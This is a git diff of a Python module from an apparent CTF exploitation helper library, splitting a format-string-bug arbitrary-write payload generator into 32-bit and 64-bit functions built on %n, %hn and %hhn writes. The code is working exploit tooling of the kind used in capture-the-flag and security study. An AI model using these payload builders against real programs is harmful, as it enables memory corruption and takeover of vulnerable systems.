@@ -1,8 +1,11 @@
-from toyotama.pwn.util import fill, p32, p64
+from toyotama.pwn.util import p32, p64
+from toyotama.util.log import Logger
+
+log = Logger()
 
 
-def fsa_write(target_addr: int, value: int, nth_stack: int, offset=0, bits=64, each=1):
-    """Arbitrary write using format string bug
+def fsa_write_32(target_addr: int, value: int, nth_stack: int, offset: int = 0, each: int = 4):
+    """Arbitrary write using format string bug (32bit)
 
     Args:
         target_addr (int): The address where the content will be written.
@@ -11,26 +14,23 @@ def fsa_write(target_addr: int, value: int, nth_stack: int, offset=0, bits=64, e
                     "AAAA%p %p %p..."
                     -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                     -> 7th (0x4141d402)
-        offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
-        bits (int, optional): The bits of the target binary.
+        offset (int, optional): From above example, offset is 2 (0x4141d402).
         each (int, optional): Write the value by each n bytes.
     Returns:
         bytes: The payload
     """
-    assert bits in (32, 64)
     assert each in (1, 2, 4)
 
-    pack = p64 if bits == 64 else p32
-    bit_len = bits
+    bit_len = 32
     byte_len = bit_len // 8
 
     # Adjust stack alignment
-    payload = fill(-offset % byte_len)
+    payload = b"A" * (-offset % byte_len)
     if offset != 0:
         nth_stack += 1
 
     for i in range(0, byte_len, each):
-        payload += pack(target_addr + i)
+        payload += p32(target_addr + i)
 
     format_string = {
         1: "hhn",
@@ -47,5 +47,51 @@ def fsa_write(target_addr: int, value: int, nth_stack: int, offset=0, bits=64, e
         payload += f"%{offset}c%{nth_stack}${format_string[each]}".encode()
         value >>= 8 * each
         nth_stack += 1
+
+    return payload
+
+
+def fsa_write_64(target_addr: int, value: int, nth_stack: int, offset: int = 0, each: int = 4):
+    """Arbitrary write using format string bug (64bit)
+
+    Args:
+        target_addr (int): The address where the content will be written.
+        value (int): The value to write.
+        nth_stack (int): example
+                    "AAAA%p %p %p..."
+                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
+                    -> 7th (0x4141d402)
+        offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
+        bits (int, optional): The bits of the target binary.
+        each (int, optional): Write the value by each n bytes.
+    Returns:
+        bytes: The payload
+    """
+    assert each in (1, 2, 4)
+
+    bit_len = 64
+    byte_len = bit_len // 8
+
+    format_string = {
+        1: "hhn",
+        2: "hn",
+        4: "n",
+    }
+
+    value = value % (1 << 8 * each)
+    assert value < 10 ** 10 and nth_stack < 10 ** 3  # To fix the payload's length
+    tentative_payload = b"A" * (-offset % byte_len)
+    tentative_payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
+    tentative_payload += b"A" * (-len(tentative_payload) % byte_len)
+
+    nth_stack += (len(tentative_payload) + byte_len - 1) // byte_len
+
+    payload = b"A" * (-offset % byte_len)
+    payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
+    payload += b"A" * (-len(payload) % byte_len)
+    payload += p64(target_addr)
+
+    if b"\0" in payload.strip(b"\0"):
+        log.warning("The payload includes some null bytes.")
 
     return payload
